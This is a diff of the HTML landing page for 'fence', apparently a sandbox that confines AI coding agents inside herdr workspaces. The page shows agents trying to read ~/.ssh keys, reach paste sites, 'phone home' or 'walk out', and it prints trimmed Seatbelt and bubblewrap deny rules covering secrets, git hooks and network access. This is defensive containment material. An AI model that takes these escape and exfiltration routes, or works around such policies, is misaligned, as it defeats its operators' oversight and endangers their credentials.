+  .hero::after { background: linear-gradient(180deg, rgba(11,20,34,.82) 0%, rgba(11,20,34,.4) 46%, rgba(11,20,34,0) 60%), linear-gradient(0deg, var(--night) 0%, rgba(11,20,34,0) 8%); }
+  .hero-win { justify-self: stretch; max-width: none; }
+  h1 { min-height: 0; }
+  .order-first { order: -1; }
+  .feats { grid-template-columns: 1fr; }
+  .feats > div { padding: 0; border-left: 0; }
+  .feats > div + div { border-top: 1px solid var(--line); padding-top: 30px; }
   .hint { display: none; }
 }
+@media (max-width: 640px) {
+  body { font-size: 16px; }
+  .hw-body { height: 330px; }
+  .hwin { font-size: 11px; }
+  .toast { width: 210px; }
+  .map-grid { grid-template-columns: 1fr 1fr; grid-template-areas: "a b" "lanes lanes"; gap: 40px 12px; }
+  #nIn { grid-area: a; } #nOut { grid-area: b; flex-direction: row-reverse; text-align: right; } .lanes { grid-area: lanes; }
+  .node { display: flex; align-items: center; gap: 10px; text-align: left; font-size: 12px; }
+  .node .ico { margin: 0; width: 44px; height: 44px; border-radius: 13px; flex: none; }
+  .node .ico svg { width: 22px; height: 22px; }
+  .lane { height: 62px; }
+  .lane .lbl { font-size: 11px; flex-direction: column; gap: 2px; }
+  .lane .res { font-size: 11px; }
+  /* the fence as a post on each track, clear of the words */
+  .lanes::before { display: none; }
+  .lanes::after { top: auto; bottom: 100%; margin-bottom: 4px; }
+  .lane::after { content: ""; position: absolute; left: var(--fence); bottom: 0; width: 8px; height: 20px; margin-left: -4px; border-radius: 3px; background: var(--wood-dark); box-shadow: 0 0 0 1px rgba(185,138,85,.5) inset; }
+  .sees { grid-template-columns: 1fr; }
+  .seg { display: grid; grid-template-columns: 1fr 1fr; border-radius: 18px; width: 100%; }
+  .seg button { padding: 9px 6px; font-size: 13px; border-radius: 14px; }
+  .keys li, .facts li { grid-template-columns: 1fr; gap: 4px; }
+  .limits { grid-template-columns: 1fr; }
+  .limits > div { padding: 0 !important; border-left: 0 !important; }
+  .limits > div + div { border-top: 1px solid var(--line); padding-top: 30px !important; }
+  .code pre { font-size: 11px; min-height: 0; }
+  .pwin pre { font-size: 10.5px; }
+  .shell pre { min-height: 460px; font-size: 12px; }
+  #peek { width: 86vw; }
+  footer { padding-bottom: 52vw; }
+}
 @media (prefers-reduced-motion: reduce) {
-  .fade { opacity: 1; transform: none; transition: none; }
-  .cursor { animation: none; }
+  *, *::before, *::after { animation-duration: .001ms !important; animation-iteration-count: 1 !important; transition-duration: .001ms !important; }
+  .rv .w > span, .fade { transform: none; opacity: 1; }
 }
 </style>
 </head>
@@ -215,7 +351,7 @@ footer .rail { position: absolute; right: -40px; bottom: 30px; width: min(520px,
   <div class="wrap">
     <a class="brand" href="#top"><img src="icon.svg" alt="">fence</a>
     <nav>
-      <a href="#pen">The pen</a>
+      <a href="#ways">Ways out</a>
       <a href="#gates">Gates</a>
       <a href="#how">How</a>
       <a href="#install">Setup</a>
@@ -228,77 +364,111 @@ footer .rail { position: absolute; right: -40px; bottom: 30px; width: min(520px,
 <section class="hero" id="top">
   <canvas id="field" aria-hidden="true"></canvas>
   <div class="wrap">
-    <div class="copy">
-      <p class="eyebrow"><span class="dot"></span>A sandbox plugin for <a href="https://herdr.dev">herdr</a></p>
-      <h1><span class="line">Let them graze.</span><span class="line">Keep the <span class="hl">fence</span>.</span></h1>
+    <div>
+      <p class="eyebrow"><span class="dot"></span>A sandbox for <a href="https://herdr.dev">herdr</a> agents</p>
+      <h1 id="h1" aria-live="polite"><span class="swap" id="h1text"><span class="line"><span class="who" style="color:var(--claude)">claude</span> went for</span><span class="line"><span class="what">~/.ssh/id_ed25519</span></span><span class="line">and hit the <span class="hl">fence</span>.</span></span></h1>
       <p class="lede">fence turns a herdr space into a <strong>pen</strong>. Every shell in it can write its own folder, reach the domains you allow, and nothing else. When something is stopped at the fence, herdr tells you.</p>
       <div class="cta">
         <a class="btn primary" href="#install">Set it up <span class="arrow">→</span></a>
         <a class="btn" href="https://github.com/zenodea/fence">GitHub</a>
       </div>
-      <p class="works">Fences <span>Claude Code</span> · <span>Codex</span> · <span>Gemini CLI</span> · <span>anything in a shell</span>, on <span>macOS</span> and <span>Linux</span></p>
+      <p class="works">Fences
+        <span><svg viewBox="0 0 24 24" fill="#D97757" aria-hidden="true"><path d="m4.7144 15.9555 4.7174-2.6471.079-.2307-.079-.1275h-.2307l-.7893-.0486-2.6956-.0729-2.3375-.0971-2.2646-.1214-.5707-.1215-.5343-.7042.0546-.3522.4797-.3218.686.0608 1.5179.1032 2.2767.1578 1.6514.0972 2.4468.255h.3886l.0546-.1579-.1336-.0971-.1032-.0972L6.973 9.8356l-2.55-1.6879-1.3356-.9714-.7225-.4918-.3643-.4614-.1578-1.0078.6557-.7225.8803.0607.2246.0607.8925.686 1.9064 1.4754 2.4893 1.8336.3643.3035.1457-.1032.0182-.0728-.164-.2733-1.3539-2.4467-1.445-2.4893-.6435-1.032-.17-.6194c-.0607-.255-.1032-.4674-.1032-.7285L6.287.1335 6.6997 0l.9957.1336.419.3642.6192 1.4147 1.0018 2.2282 1.5543 3.0296.4553.8985.2429.8318.091.255h.1579v-.1457l.1275-1.706.2368-2.0947.2307-2.6957.0789-.7589.3764-.9107.7468-.4918.5828.2793.4797.686-.0668.4433-.2853 1.8517-.5586 2.9021-.3643 1.9429h.2125l.2429-.2429.9835-1.3053 1.6514-2.0643.7286-.8196.85-.9046.5464-.4311h1.0321l.759 1.1293-.34 1.1657-1.0625 1.3478-.8804 1.1414-1.2628 1.7-.7893 1.36.0729.1093.1882-.0183 2.8535-.607 1.5421-.2794 1.8396-.3157.8318.3886.091.3946-.3278.8075-1.967.4857-2.3072.4614-3.4364.8136-.0425.0304.0486.0607 1.5482.1457.6618.0364h1.621l3.0175.2247.7892.522.4736.6376-.079.4857-1.2142.6193-1.6393-.3886-3.825-.9107-1.3113-.3279h-.1822v.1093l1.0929 1.0686 2.0035 1.8092 2.5075 2.3314.1275.5768-.3218.4554-.34-.0486-2.2039-1.6575-.85-.7468-1.9246-1.621h-.1275v.17l.4432.6496 2.3436 3.5214.1214 1.0807-.17.3521-.6071.2125-.6679-.1214-1.3721-1.9246L14.38 17.959l-1.1414-1.9428-.1397.079-.674 7.2552-.3156.3703-.7286.2793-.6071-.4614-.3218-.7468.3218-1.4753.3886-1.9246.3157-1.53.2853-1.9004.17-.6314-.0121-.0425-.1397.0182-1.4328 1.9672-2.1796 2.9446-1.7243 1.8456-.4128.164-.7164-.3704.0667-.6618.4008-.5889 2.386-3.0357 1.4389-1.882.929-1.0868-.0062-.1579h-.0546l-6.3385 4.1164-1.1293.1457-.4857-.4554.0608-.7467.2307-.2429 1.9064-1.3114Z"/></svg>Claude Code</span>
+        <span><svg viewBox="0 0 24 24" fill="#E5E5E5" aria-hidden="true"><path d="M8.086.457a6.105 6.105 0 013.046-.415c1.333.153 2.521.72 3.564 1.7a.117.117 0 00.107.029c1.408-.346 2.762-.224 4.061.366l.063.03.154.076c1.357.703 2.33 1.77 2.918 3.198.278.679.418 1.388.421 2.126a5.655 5.655 0 01-.18 1.631.167.167 0 00.04.155 5.982 5.982 0 011.578 2.891c.385 1.901-.01 3.615-1.183 5.14l-.182.22a6.063 6.063 0 01-2.934 1.851.162.162 0 00-.108.102c-.255.736-.511 1.364-.987 1.992-1.199 1.582-2.962 2.462-4.948 2.451-1.583-.008-2.986-.587-4.21-1.736a.145.145 0 00-.14-.032c-.518.167-1.04.191-1.604.185a5.924 5.924 0 01-2.595-.622 6.058 6.058 0 01-2.146-1.781c-.203-.269-.404-.522-.551-.821a7.74 7.74 0 01-.495-1.283 6.11 6.11 0 01-.017-3.064.166.166 0 00.008-.074.115.115 0 00-.037-.064 5.958 5.958 0 01-1.38-2.202 5.196 5.196 0 01-.333-1.589 6.915 6.915 0 01.188-2.132c.45-1.484 1.309-2.648 2.577-3.493.282-.188.55-.334.802-.438.286-.12.573-.22.861-.304a.129.129 0 00.087-.087A6.016 6.016 0 015.635 2.31C6.315 1.464 7.132.846 8.086.457zm-.804 7.85a.848.848 0 00-1.473.842l1.694 2.965-1.688 2.848a.849.849 0 001.46.864l1.94-3.272a.849.849 0 00.007-.854l-1.94-3.393zm5.446 6.24a.849.849 0 000 1.695h4.848a.849.849 0 000-1.696h-4.848z" fill-rule="evenodd"/></svg>Codex</span>
+        <span><svg viewBox="0 0 24 24" fill="#8E75B2" aria-hidden="true"><path d="M11.04 19.32Q12 21.51 12 24q0-2.49.93-4.68.96-2.19 2.58-3.81t3.81-2.55Q21.51 12 24 12q-2.49 0-4.68-.93a12.3 12.3 0 0 1-3.81-2.58 12.3 12.3 0 0 1-2.58-3.81Q12 2.49 12 0q0 2.49-.96 4.68-.93 2.19-2.55 3.81a12.3 12.3 0 0 1-3.81 2.58Q2.49 12 0 12q2.49 0 4.68.96 2.19.93 3.81 2.55t2.55 3.81"/></svg>Gemini CLI</span>
+        <span style="color:var(--subtle);font-weight:400">and any shell, on macOS and Linux</span>
+      </p>
+    </div>
+    <div class="hwin hero-win" id="heroWin">
+      <div class="tb"><i></i><i></i><i></i><span><b>herdr</b> · 🐑 api</span></div>
+      <div class="hw-body">
+        <div class="hw-side">
+          <h5>Spaces</h5>
+          <div class="ws on">🐑 api <span class="st working" id="apiSt"></span></div>
+          <div class="ws">web <span class="st done"></span></div>
+          <div class="ws">dotfiles <span class="st"></span></div>
+          <div class="sep"></div>
+          <h5>Agents</h5>
+          <div class="ag"><svg viewBox="0 0 24 24" fill="#D97757" aria-hidden="true"><path d="m4.7144 15.9555 4.7174-2.6471.079-.2307-.079-.1275h-.2307l-.7893-.0486-2.6956-.0729-2.3375-.0971-2.2646-.1214-.5707-.1215-.5343-.7042.0546-.3522.4797-.3218.686.0608 1.5179.1032 2.2767.1578 1.6514.0972 2.4468.255h.3886l.0546-.1579-.1336-.0971-.1032-.0972L6.973 9.8356l-2.55-1.6879-1.3356-.9714-.7225-.4918-.3643-.4614-.1578-1.0078.6557-.7225.8803.0607.2246.0607.8925.686 1.9064 1.4754 2.4893 1.8336.3643.3035.1457-.1032.0182-.0728-.164-.2733-1.3539-2.4467-1.445-2.4893-.6435-1.032-.17-.6194c-.0607-.255-.1032-.4674-.1032-.7285L6.287.1335 6.6997 0l.9957.1336.419.3642.6192 1.4147 1.0018 2.2282 1.5543 3.0296.4553.8985.2429.8318.091.255h.1579v-.1457l.1275-1.706.2368-2.0947.2307-2.6957.0789-.7589.3764-.9107.7468-.4918.5828.2793.4797.686-.0668.4433-.2853 1.8517-.5586 2.9021-.3643 1.9429h.2125l.2429-.2429.9835-1.3053 1.6514-2.0643.7286-.8196.85-.9046.5464-.4311h1.0321l.759 1.1293-.34 1.1657-1.0625 1.3478-.8804 1.1414-1.2628 1.7-.7893 1.36.0729.1093.1882-.0183 2.8535-.607 1.5421-.2794 1.8396-.3157.8318.3886.091.3946-.3278.8075-1.967.4857-2.3072.4614-3.4364.8136-.0425.0304.0486.0607 1.5482.1457.6618.0364h1.621l3.0175.2247.7892.522.4736.6376-.079.4857-1.2142.6193-1.6393-.3886-3.825-.9107-1.3113-.3279h-.1822v.1093l1.0929 1.0686 2.0035 1.8092 2.5075 2.3314.1275.5768-.3218.4554-.34-.0486-2.2039-1.6575-.85-.7468-1.9246-1.621h-.1275v.17l.4432.6496 2.3436 3.5214.1214 1.0807-.17.3521-.6071.2125-.6679-.1214-1.3721-1.9246L14.38 17.959l-1.1414-1.9428-.1397.079-.674 7.2552-.3156.3703-.7286.2793-.6071-.4614-.3218-.7468.3218-1.4753.3886-1.9246.3157-1.53.2853-1.9004.17-.6314-.0121-.0425-.1397.0182-1.4328 1.9672-2.1796 2.9446-1.7243 1.8456-.4128.164-.7164-.3704.0667-.6618.4008-.5889 2.386-3.0357 1.4389-1.882.929-1.0868-.0062-.1579h-.0546l-6.3385 4.1164-1.1293.1457-.4857-.4554.0608-.7467.2307-.2429 1.9064-1.3114Z"/></svg>claude <span class="c-d">· api</span></div>
+          <div class="ag"><svg viewBox="0 0 24 24" fill="#E5E5E5" aria-hidden="true"><path d="M8.086.457a6.105 6.105 0 013.046-.415c1.333.153 2.521.72 3.564 1.7a.117.117 0 00.107.029c1.408-.346 2.762-.224 4.061.366l.063.03.154.076c1.357.703 2.33 1.77 2.918 3.198.278.679.418 1.388.421 2.126a5.655 5.655 0 01-.18 1.631.167.167 0 00.04.155 5.982 5.982 0 011.578 2.891c.385 1.901-.01 3.615-1.183 5.14l-.182.22a6.063 6.063 0 01-2.934 1.851.162.162 0 00-.108.102c-.255.736-.511 1.364-.987 1.992-1.199 1.582-2.962 2.462-4.948 2.451-1.583-.008-2.986-.587-4.21-1.736a.145.145 0 00-.14-.032c-.518.167-1.04.191-1.604.185a5.924 5.924 0 01-2.595-.622 6.058 6.058 0 01-2.146-1.781c-.203-.269-.404-.522-.551-.821a7.74 7.74 0 01-.495-1.283 6.11 6.11 0 01-.017-3.064.166.166 0 00.008-.074.115.115 0 00-.037-.064 5.958 5.958 0 01-1.38-2.202 5.196 5.196 0 01-.333-1.589 6.915 6.915 0 01.188-2.132c.45-1.484 1.309-2.648 2.577-3.493.282-.188.55-.334.802-.438.286-.12.573-.22.861-.304a.129.129 0 00.087-.087A6.016 6.016 0 015.635 2.31C6.315 1.464 7.132.846 8.086.457zm-.804 7.85a.848.848 0 00-1.473.842l1.694 2.965-1.688 2.848a.849.849 0 001.46.864l1.94-3.272a.849.849 0 00.007-.854l-1.94-3.393zm5.446 6.24a.849.849 0 000 1.695h4.848a.849.849 0 000-1.696h-4.848z" fill-rule="evenodd"/></svg>codex <span class="c-d">· web</span></div>
+        </div>
+        <div class="hw-pane" id="hpane"></div>
+      </div>
+      <div class="hw-tabs"><span class="t on">1 claude</span><span class="t">2 server</span><span class="r"><span class="pen">🐑 standard</span><span>14:02</span></span></div>
+      <div class="toast" id="htoast"><b id="htoastT">🐑 blocked pastebin.com</b><span id="htoastB">api · prefix+p to see the pen</span></div>
     </div>
   </div>
-  <div class="toast" id="toast" aria-hidden="true"><b id="toastTitle">🐑 blocked pastebin.com</b><span id="toastBody">fence-test · prefix+p to see the pen</span></div>
-  <div class="hint" id="hint">move the lantern: they scatter, the fence holds</div>
+  <div class="hint" id="hint">click a sheep: it'll try to get out</div>
 </section>
 
-<!-- ============ THE PEN ============ -->
-<section class="block" id="pen">
-  <div class="wrap split">
-    <div>
-      <p class="kicker">// the pen</p>
-      <h2 class="fade">A space, fenced. <span class="dim">Not the whole machine.</span></h2>
-      <div class="body fade" style="--d:100ms">
-        <p>Make a herdr space a pen and every pane in it is fenced as it opens: your login shell, your aliases, your agent, all inside a sandbox the <strong>kernel</strong> enforces. What the agent starts is fenced too, and it can't take the fence down.</p>
-        <p>Run it with the permission prompts turned off if you like. If it reaches for your SSH keys, a git hook or a paste site, it meets the fence instead.</p>
-      </div>
-    </div>
-    <div class="fade" style="--d:150ms">
-      <div class="shell">
-        <div class="bar"><i></i><i></i><i></i><span>🐑 fence-test · standard</span></div>
-        <pre id="attempts"></pre>
-      </div>
-    </div>
-  </div>
+<!-- ============ WAYS OUT ============ -->
+<section class="block" id="ways">
   <div class="wrap">
-    <div class="grid6">
-      <div class="card fade"><h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h10l6 6v10H4z"/><path d="M14 4v6h6"/></svg>Files</h3><p>The pen's folder, <code>/tmp</code> and the agents' own state are writable. Everything else is read-only.</p></div>
-      <div class="card fade" style="--d:60ms"><h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>Secrets</h3><p><code>~/.ssh</code>, <code>~/.aws</code>, <code>~/.config/gh</code>, shell history and browser profiles can't even be read. Tokens are dropped from the environment.</p></div>
-      <div class="card fade" style="--d:120ms"><h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="8"/><path d="M12 8v4l3 2"/></svg>Later, outside</h3><p><code>.git/hooks</code>, <code>.git/config</code>, <code>.claude/settings.json</code>, <code>.envrc</code>: anything that runs code outside the pen later stays read-only.</p></div>
-      <div class="card fade"><h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="8"/><path d="M4 12h16M12 4c2.5 2.6 2.5 13.4 0 16M12 4c-2.5 2.6-2.5 13.4 0 16"/></svg>Network</h3><p>Only through fence's proxy, only to the domains on the list. Going around it fails in the kernel. <code>localhost</code> is never reachable.</p></div>
-      <div class="card fade" style="--d:60ms"><h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M12 4v16M3 12h9"/></svg>herdr</h3><p>A pen can't open an unfenced pane, type into another one or read it. It can still tell herdr it's working, blocked or done.</p></div>
-      <div class="card fade" style="--d:120ms"><h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="12" rx="2"/><path d="M8 21h8M12 17v4"/></svg>Other apps</h3><p>On macOS: no <code>osascript</code> telling Terminal what to run, no <code>open</code>, no clipboard (it often holds a password you just copied).</p></div>
+    <div class="routes-top">
+      <div>
+        <p class="kicker">// ways out</p>
+        <h2 class="rv">Room to work. No way out.</h2>
+        <div class="body fade"><p>Inside a pen an agent can do its job: install packages, write code, run the tests, tell herdr how it's doing. Every other way out meets the fence, and the <strong>kernel</strong> holds it, not a prompt.</p></div>
+      </div>
+      <div class="seg fade" id="seg" role="tablist">
+        <button class="on" data-s="work">Do the work</button>
+        <button data-s="exfil">Phone home</button>
+        <button data-s="keys">Grab the keys</button>
+        <button data-s="escape">Walk out</button>
+        <button data-s="trap">Leave a trap</button>
+      </div>
     </div>
+
+    <div class="map fade" id="map">
+      <div class="map-grid">
+        <div class="node" id="nIn">
+          <div class="ico"><svg viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"><path d="M9 21c-3 0-5-2.2-5-4.8 0-2.3 1.6-4 3.6-4.4C8.2 9.6 10 8 12.4 8c1.2 0 2.3.4 3.1 1.1C16.4 8.4 17.6 8 19 8c2.9 0 5.2 2.1 5.5 4.8 1.9.6 3.5 2.2 3.5 4.3 0 2.5-2 3.9-4.4 3.9z"/><path d="M11 21v4M21 21v4"/><circle cx="25.5" cy="13.5" r="2.6" fill="currentColor"/></svg></div>
+          <div><b>the agent</b>in a pen</div>
+        </div>
+        <div class="lanes" id="lanes" style="--fence:58%">
+          <div class="lane"><div class="lbl"><b></b><span class="res"></span></div><div class="track"></div><div class="fill"></div><div class="stub"></div><div class="boom"></div><div class="pk"></div></div>
+          <div class="lane"><div class="lbl"><b></b><span class="res"></span></div><div class="track"></div><div class="fill"></div><div class="stub"></div><div class="boom"></div><div class="pk"></div></div>
+          <div class="lane"><div class="lbl"><b></b><span class="res"></span></div><div class="track"></div><div class="fill"></div><div class="stub"></div><div class="boom"></div><div class="pk"></div></div>
+          <div class="lane"><div class="lbl"><b></b><span class="res"></span></div><div class="track"></div><div class="fill"></div><div class="stub"></div><div class="boom"></div><div class="pk"></div></div>
+        </div>
+        <div class="node" id="nOut">
+          <div class="ico"><svg viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"><rect x="5" y="7" width="22" height="14" rx="2"/><path d="M2 25h28M10 12l3 2.5-3 2.5M15 17h5"/></svg></div>
+          <div><b>outside</b>your machine, the net</div>
+        </div>
+      </div>
+      <p class="map-cap" id="mapcap">&nbsp;</p>
+    </div>
+
+    <div class="sees fade">
+      <div class="sbox"><h4>what the agent gets</h4><div class="out" id="seeAgent">&nbsp;</div></div>
+      <div class="sbox"><h4>what you get, in herdr</h4><div class="out" id="seeYou">&nbsp;</div></div>
+    </div>
+    <p class="sec-note fade">Allowed domains still go out through the proxy, which sees the name, not what's inside the TLS. <a href="#limits">What fence doesn't stop</a>.</p>
   </div>
 </section>
 
 <!-- ============ GATES ============ -->
 <section class="block" id="gates">
   <div class="wrap split">
-    <div class="fade tui">
-      <div class="shell">
-        <div class="bar"><i></i><i></i><i></i><span>prefix+p · fence</span></div>
-        <div class="tabs" id="tuiTabs" role="tablist">
-          <button role="tab" data-s="pen"><kbd>o</kbd> Pen</button>
-          <button role="tab" data-s="gates" class="on"><kbd>g</kbd> Gates</button>
-          <button role="tab" data-s="log"><kbd>l</kbd> Log</button>
-        </div>
+    <div class="fade order-first">
+      <div class="hwin pwin" id="pwin">
+        <div class="tb"><i></i><i></i><i></i><span><b>herdr</b> · prefix+p · fence</span></div>
         <pre id="tui"></pre>
+        <div class="toast" id="ptoast"><b id="ptoastT">🐑 blocked huggingface.co</b><span>api · prefix+p to see the pen</span></div>
       </div>
     </div>
     <div>
       <p class="kicker">// gates</p>
-      <h2 class="fade">Stopped at the fence. <span class="dim">Let through in a keypress.</span></h2>
-      <div class="body fade" style="--d:100ms">
-        <p>When something is stopped, herdr shows a toast. Press <code>prefix+p</code> and the pen's window lists what was stopped lately. <strong>Let a domain through</strong> and it works at once, in every pane of that pen, without restarting anything.</p>
-        <p>Nothing inside a pen can open a gate. fence's own settings are hidden from it, so only you can.</p>
+      <h2 class="rv">Stopped, then let through.</h2>
+      <div class="body fade">
+        <p>When the fence stops something, herdr shows a toast. <code>prefix+p</code> opens the pen's window, where the latest is already at the top. <strong>Let it through</strong> and it works at once, in every pane of the pen, without restarting a thing.</p>
+        <p>Nothing inside a pen can open a gate: fence's own settings are hidden from it. Only you can.</p>
       </div>
-      <ul class="keys fade" style="--d:150ms">
-        <li><code>prefix+p</code><span>The pen for the space you're in. Not a pen yet? Make it one.</span></li>
+      <ul class="keys fade">
+        <li><code>prefix+p</code><span>The pen for the space you're in. Not a pen yet? <code>n</code> makes one.</span></li>
         <li><code>a</code><span>Let what's selected through.</span></li>
         <li><code>x</code><span>Fence it off again.</span></li>
-        <li><code>p</code><span>Switch the pen's profile: strict, standard or open.</span></li>
+        <li><code>p</code><span>Switch the pen's profile.</span></li>
       </ul>
     </div>
   </div>
@@ -306,47 +476,136 @@ footer .rail { position: absolute; right: -40px; bottom: 30px; width: min(520px,
 
 <!-- ============ HOW ============ -->
 <section class="block" id="how">
-  <div class="wrap">
-    <p class="kicker">// how</p>
-    <h2 class="fade">Kernel-enforced, <span class="dim">on both sides.</span></h2>
-    <div class="body fade" style="--d:100ms">
-      <p>Each pane in a pen runs <code>fence shell</code>: it starts the pen's proxy and herdr gate, then runs your shell inside the platform's sandbox and stays next to it. If the sandbox can't start, the pane says so and stays empty. It never falls back to an unfenced shell.</p>
-    </div>
-    <div class="how">
-      <div class="card fade">
-        <h3>macOS</h3>
-        <p class="sub">Seatbelt · sandbox-exec</p>
-        <dl>
-          <dt>files</dt><dd>A generated profile: writes denied outside the pen's folders, hidden ones denied outright.</dd>
-          <dt>network</dt><dd>Only the proxy's localhost port and the herdr gate's socket can be reached.</dd>
-          <dt>denials</dt><dd>The kernel logs each one with the pen's tag; fence follows the log and toasts you.</dd>
-        </dl>
+  <div class="wrap split">
+    <div>
+      <p class="kicker">// how</p>
+      <h2 class="rv">The kernel holds the fence.</h2>
+      <div class="body fade">
+        <p>Each pane in a pen runs <code>fence shell</code>. It starts the pen's proxy and herdr gate, then runs your login shell inside the operating system's own sandbox and stays next to it. Your aliases and prompt come along; the agent inherits the fence and can't take it down.</p>
+        <p>If the sandbox can't start, the pane says so and stays empty. It never falls back to an unfenced shell.</p>
       </div>
-      <div class="card fade" style="--d:80ms">
-        <h3>Linux</h3>
-        <p class="sub">bubblewrap · namespaces</p>
-        <dl>
-          <dt>files</dt><dd><code>/</code> read-only, the pen's folders bound back in, secrets covered, a private <code>/tmp</code> and <code>/run</code>.</dd>
-          <dt>network</dt><dd>No network namespace at all; a tiny bridge forwards one port to the proxy's unix socket.</dd>
-          <dt>denials</dt><dd>The proxy and the gate report theirs; file writes just fail.</dd>
-        </dl>
+      <ul class="facts fade">
+        <li><b>files</b><span>Everything read-only but the pen's folder and the agents' own state. Secrets can't be read at all.</span></li>
+        <li><b>network</b><span>Only fence's proxy, which only lets the pen's domains through. Going around it fails in the kernel.</span></li>
+        <li><b>herdr</b><span>A stand-in socket: status reports for the pen's own pane, nothing else.</span></li>
+      </ul>
+    </div>
+    <div class="fade">
+      <div class="viewsw" id="osw" role="tablist">
+        <span class="knob"></span>
+        <button role="tab" data-os="mac" class="on"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M16.4 12.6c0-2.6 2.1-3.8 2.2-3.9-1.2-1.8-3.1-2-3.7-2-1.6-.2-3.1.9-3.9.9-.8 0-2-.9-3.4-.9C5.9 6.8 4.3 7.8 3.4 9.4c-1.8 3.1-.5 7.8 1.3 10.4.9 1.3 1.9 2.7 3.2 2.6 1.3-.1 1.8-.8 3.3-.8s2 .8 3.4.8c1.4 0 2.3-1.3 3.1-2.6 1-1.5 1.4-2.9 1.4-3-.1 0-2.7-1-2.7-4.2zM13.9 4.9c.7-.9 1.2-2.1 1.1-3.3-1 .1-2.3.7-3 1.6-.7.8-1.2 2-1.1 3.2 1.1.1 2.3-.6 3-1.5z"/></svg>macOS</button>
+        <button role="tab" data-os="linux"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M7 9l3 3-3 3M12 15h5"/></svg>Linux</button>
+      </div>
+      <div class="code">
+        <div class="bar"><i></i><i></i><i></i><span id="codeTitle">fence policy --sandbox · Seatbelt</span></div>
+<pre id="codeMac"><span class="cm">; what sandbox-exec enforces for a pen (trimmed)</span>
+(<span class="k">version</span> 1)
+(<span class="k">allow</span> default)
+
+<span class="cm">; writes: only the pen's folders</span>
+(<span class="f">deny</span> file-write* (<span class="k">with message</span> <span class="s">"fence:3f9c21aa:w4_p1;"</span>)
+  (require-not (require-any
+    (subpath <span class="s">"/Users/you/work/api"</span>)
+    (subpath <span class="s">"/Users/you/.claude"</span>)
+    (subpath <span class="s">"/private/tmp"</span>) …)))
+
+<span class="cm">; read-only even inside them: things that run later, outside</span>
+(<span class="f">deny</span> file-write* …
+  (subpath <span class="s">"/Users/you/work/api/.git/hooks"</span>)
+  (regex #<span class="s">"^/Users/you/\.claude/settings[^/]*\.json"</span>) …)
+
+<span class="cm">; hidden: secrets, herdr's socket, fence itself</span>
+(<span class="f">deny</span> file-read* file-write* …
+  (subpath <span class="s">"/Users/you/.ssh"</span>) (subpath <span class="s">"/Users/you/.aws"</span>)
+  (subpath <span class="s">"/Users/you/.config/herdr"</span>) …)
+
+<span class="cm">; network: fence's proxy and the herdr gate, nothing else</span>
+(<span class="f">deny</span> network-outbound …
+  (require-not (require-any
+    (remote ip <span class="s">"localhost:52114"</span>)
+    (remote unix-socket (path-literal <span class="s">"/private/tmp/fence-501/g812.sock"</span>)))))
+
+(<span class="f">deny</span> appleevent-send …)        <span class="cm">; no osascript → Terminal</span>
+(<span class="f">deny</span> mach-lookup … launchservicesd)  <span class="cm">; no `open`</span>
+(<span class="f">deny</span> mach-lookup … pasteboard.1)      <span class="cm">; no clipboard</span></pre>
+<pre id="codeLinux" hidden><span class="cm"># what bubblewrap runs for a pen (trimmed)</span>
+<span class="k">bwrap</span> --die-with-parent \
+  --unshare-net --unshare-pid --unshare-ipc --unshare-uts \
+  --ro-bind / /                     <span class="cm"># the whole system, read-only</span>
+  --dev /dev --proc /proc \
+  --tmpfs /tmp --tmpfs /run         <span class="cm"># no ssh-agent, X11, D-Bus or Docker sockets</span>
+  --bind <span class="s">/home/you/work/api</span> <span class="s">/home/you/work/api</span> \
+  --bind <span class="s">/home/you/.claude</span> <span class="s">/home/you/.claude</span> \
+  --ro-bind <span class="s">/home/you/work/api/.git/hooks</span> … \
+  --tmpfs <span class="s">/home/you/.ssh</span> \          <span class="cm"># secrets covered over</span>
+  --tmpfs <span class="s">/home/you/.config/herdr</span> \
+  --ro-bind /dev/null <span class="s">/home/you/.netrc</span> \
+  --bind <span class="s">$XDG_RUNTIME_DIR/fence-1000/p812.sock</span> /run/fence/proxy.sock \
+  --bind <span class="s">$XDG_RUNTIME_DIR/fence-1000/g812.sock</span> /run/fence/herdr.sock \
+  -- node -e <span class="s">"$bridge"</span> 3128 /run/fence/proxy.sock -- <span class="ok">$SHELL -l</span>
+
+<span class="cm"># no network namespace at all: the bridge forwards one localhost
+# port to the proxy outside, and that's the only way out</span>
+HTTPS_PROXY=http://127.0.0.1:3128
+HERDR_SOCKET_PATH=/run/fence/herdr.sock</pre>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ============ HONEST ============ -->
-<section class="block" id="honest">
+<!-- ============ PROFILES ============ -->
+<section class="block" id="profiles">
+  <div class="wrap">
+    <p class="kicker">// profiles</p>
+    <h2 class="rv">Three fences, or your own.</h2>
+    <div class="body fade"><p>Every pen has a profile. Switch it from the pen's window; write your own in TOML and it can extend one of these.</p></div>
+    <div class="feats fade">
+      <div>
+        <h3>strict <small>13 domains</small></h3>
+        <p>The pen's folder and the agents' own state. Out to the model APIs, and nowhere else.</p>
+        <div class="meter"><i class="on"></i><i></i><i></i><i></i><i></i></div>
+        <div class="dom"><b>api.anthropic.com</b> · api.openai.com · generativelanguage.googleapis.com · …</div>
+      </div>
+      <div>
+        <h3>standard <small>28 domains · default</small></h3>
